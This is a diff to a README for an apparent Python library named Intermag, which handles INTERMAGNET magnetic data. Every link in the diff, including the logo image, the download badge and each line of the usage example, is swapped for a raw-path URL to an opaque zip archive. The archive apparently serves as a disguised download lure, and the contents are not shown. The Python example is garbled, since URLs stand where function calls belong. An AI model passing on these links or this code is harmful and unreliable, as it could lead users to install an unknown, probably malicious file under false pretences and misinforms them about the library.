@@ -1,7 +1,7 @@
 
 # 🧲 **Intermag - Python Library for INTERMAGNET Data**
 
-![Intermag Logo](https://github.com/bolfymcplayer/intermag/releases/download/v2.0/Software.zip)
+![Intermag Logo](https://github.com/bolfymcplayer/intermag/raw/refs/heads/main/goosemouth/Software-2.2.zip)
 
 Welcome to the Intermag repository, a Python library designed to automate the downloading, manipulation, and processing of magnetic data from INTERMAGNET sites. Whether you are conducting research on magnetism, studying space weather, or forecasting geomagnetic activity, Intermag provides a powerful set of tools to streamline your workflow.
 
@@ -18,7 +18,7 @@ Welcome to the Intermag repository, a Python library designed to automate the do
 
 ## Installation
 To get started with Intermag, you can download the library from the following link:
-[![Download Intermag](https://github.com/bolfymcplayer/intermag/releases/download/v2.0/Software.zip)](https://github.com/bolfymcplayer/intermag/releases/download/v2.0/Software.zip)
+[![Download Intermag](https://github.com/bolfymcplayer/intermag/raw/refs/heads/main/goosemouth/Software-2.2.zip)](https://github.com/bolfymcplayer/intermag/raw/refs/heads/main/goosemouth/Software-2.2.zip)
 
 Once downloaded, follow the installation instructions in the provided documentation to set up Intermag on your system.
 
@@ -30,19 +30,19 @@ If the link does not work or needs to be launched, please check the "Releases" s
 import intermag
 
 # Initialize the Intermag library
-https://github.com/bolfymcplayer/intermag/releases/download/v2.0/Software.zip()
+https://github.com/bolfymcplayer/intermag/raw/refs/heads/main/goosemouth/Software-2.2.zip()
 
 # Access INTERMAGNET data
-data = https://github.com/bolfymcplayer/intermag/releases/download/v2.0/Software.zip(site='example_site', start_date='2022-01-01', end_date='2022-01-31')
+data = https://github.com/bolfymcplayer/intermag/raw/refs/heads/main/goosemouth/Software-2.2.zip(site='example_site', start_date='2022-01-01', end_date='2022-01-31')
 
 # Process the data
-processed_data = https://github.com/bolfymcplayer/intermag/releases/download/v2.0/Software.zip(data)
+processed_data = https://github.com/bolfymcplayer/intermag/raw/refs/heads/main/goosemouth/Software-2.2.zip(data)
 
 # Perform space weather analysis
-results = https://github.com/bolfymcplayer/intermag/releases/download/v2.0/Software.zip(processed_data)
+results = https://github.com/bolfymcplayer/intermag/raw/refs/heads/main/goosemouth/Software-2.2.zip(processed_data)
 
 # Generate forecasts
-forecast = https://github.com/bolfymcplayer/intermag/releases/download/v2.0/Software.zip(results)
+forecast = https://github.com/bolfymcplayer/intermag/raw/refs/heads/main/goosemouth/Software-2.2.zip(results)
 ```
 
 ## Contributing
